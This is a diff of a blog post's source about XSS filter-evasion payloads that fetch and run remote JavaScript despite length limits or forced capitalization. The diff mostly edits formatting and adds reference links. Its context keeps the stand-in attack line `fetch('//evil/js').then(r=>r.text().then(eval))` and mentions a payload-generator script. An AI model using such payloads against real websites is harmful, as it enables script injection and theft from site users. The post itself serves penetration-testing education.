@@ -2,8 +2,9 @@
 layout: article
 show_edit_on_github: false
 title:  "XSS evasion techniques to fetch an external resource"
-date:   2019-02-23 19:31:52 +1300
-tags:   xss evasion
+date:   2019-02-23 19:31 +1300
+modify_date: 2019-02-28 13:44 +1300
+tags:   xss evasion attack
 article_header:
   type: cover
   image:
@@ -13,6 +14,8 @@ aside:
 ---
 
 So you popped that sweet `alert(1)` and now want to do something that's actually useful, but the input is being truncated to 15 characters? Or maybe your input is being capitalized? Let's look at some ways to go around it.
+
+<!--more-->
 
 # The payload
 
@@ -24,37 +27,30 @@ For example purposes the malicious JavaScript is at `//evil/js`. The payload, in
 fetch('//evil/js').then(r=>r.text().then(eval))
 ```
 
-<br/>
-
 ---
-
-<br/>
 
 # Table of Contents
 
 Encodings marked with :four_leaf_clover: can be easily customized for arbitrary payloads using either the `fetch_helpers.py` script in the [Appendix](#appendix-helper-script), or by trivial editting.
 
 * [First things first](#first-things-first)
-  * [Event handlers](#event-handlers)
+  - [Event handlers](#event-handlers)
 * [Dealing with limited space](#dealing-with-limited-space)
-  * [Usecase: character limit is &gt;= 20 (not including wrapping)](#usecase-character-limit-is--20-not-including-wrapping)
-  * [Usecase: character limit is &gt;= 13 (not including wrapping)](#usecase-character-limit-is--13-not-including-wrapping)
-  * :four_leaf_clover:[Usecase: character limit is &gt;= 10](#usecase-character-limit-is--10)
-    * [How to modify it](#how-to-modify-it)
+  - [Usecase: character limit is &gt;= 20 (not including wrapping)](#usecase-character-limit-is--20-not-including-wrapping)
+  - [Usecase: character limit is &gt;= 13 (not including wrapping)](#usecase-character-limit-is--13-not-including-wrapping)
+  - :four_leaf_clover:[Usecase: character limit is &gt;= 10](#usecase-character-limit-is--10)
+    + [How to modify it](#how-to-modify-it)
 * [Dealing with capitalization](#dealing-with-capitalization)
-  * :four_leaf_clover:[Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)](#usecase-payload-is-being-capitalized-character-limit--131-not-including-wrapping-and-length-of-external-resource-url)
-    * [Explanation](#explanation)
-  * :four_leaf_clover:[Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)](#usecase-payload-is-being-capitalized-character-limit--342-not-including-wrapping-may-vary-depending-on-external-resource-url)
-    * [Explanation (with comments)](#explanation-with-comments)
-    * [How to modify it](#how-to-modify-it-1)
-  * [Usecase: payload is being capitalized, character limit &gt;= 10](#usecase-payload-is-being-capitalized-character-limit--10)
+  - :four_leaf_clover:[Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)](#usecase-payload-is-being-capitalized-character-limit--131-not-including-wrapping-and-length-of-external-resource-url)
+    + [Explanation](#explanation)
+  - :four_leaf_clover:[Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)](#usecase-payload-is-being-capitalized-character-limit--342-not-including-wrapping-may-vary-depending-on-external-resource-url)
+    + [Explanation (with comments)](#explanation-with-comments)
+    + [How to modify it](#how-to-modify-it-1)
+  - [Usecase: payload is being capitalized, character limit &gt;= 10](#usecase-payload-is-being-capitalized-character-limit--10)
 * [Appendix: Helper script](#appendix-helper-script)
-
-<br/>
+* [References and further reading](#references-and-further-reading)
 
 ---
-
-<br/>
 
 # First things first
 
@@ -387,6 +383,8 @@ Payload is the same as the one above. Split here to 10 characters for completene
 
 Use this script to generate some of the above types of payloads, but with the URL of your external resource to fetch. You can also adjust the character limit. This blog post assumes it's called `fetch_helpers.py`.
 
+The script may have been updated, check [the latest version](https://github.com/aurainfosec/xss_payloads/blob/master/fetch_helpers.py).
+
 ```python
 #!/usr/bin/env python2
 
@@ -670,3 +668,7 @@ if __name__ == "__main__":
     
     print '%s' % getattr(p, 'as_'+args.encoding)(**vars(args))
 ```
+
+# References and further reading
+
+* The [*Dealing with capitalization*](#dealing-with-capitalization) solution was inspired by [JSFuck](http://www.jsfuck.com/). In comparison it allows a lot more characters (all except lowercase letters). Consequently it's a lot less verbose than JSFuck.
